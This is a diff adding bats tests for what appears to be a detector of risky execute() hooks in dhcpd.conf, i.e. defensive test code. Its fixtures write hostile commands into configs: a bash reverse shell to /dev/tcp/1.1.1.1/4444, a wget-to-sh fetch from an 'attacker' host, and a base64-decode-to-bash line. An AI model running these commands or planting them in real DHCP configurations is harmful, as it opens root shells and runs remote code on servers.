@@ -155,3 +155,55 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     PROFILE=enforce run run_wd
     [ "${status}" -eq 0 ]
 }
+
+@test "baseline is chmod 0600 (confidentiality — dhcpd-exec inventory enumerates DHCP-lease-trigger root-exec surface)" {
+    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (execute() under /var/tmp): writable-root expansion" {
+    printf 'on commit { execute("/var/tmp/evil.sh"); }\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (execute() under /dev/shm): tmpfs writable-root expansion" {
+    printf 'on commit { execute("/dev/shm/evil.sh"); }\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (execute() with reverse-shell pattern in args)" {
+    printf 'on commit { execute("/bin/bash", "-c", "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"); }\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (execute() with wget-pipe-sh in args)" {
+    printf 'on commit { execute("/bin/sh", "-c", "wget -qO- http://attacker/p | sh"); }\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (execute() with base64-decode-pipe in args)" {
+    printf 'on commit { execute("/bin/sh", "-c", "echo YmFzaCAtaQ== | base64 -d | bash"); }\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (world-writable dhcpd.conf → alert)" {
+    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
+    run_wd
+    chmod 0666 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-dhcpd-exec -- ')
+    [ "${main_count}" = "1" ]
+}
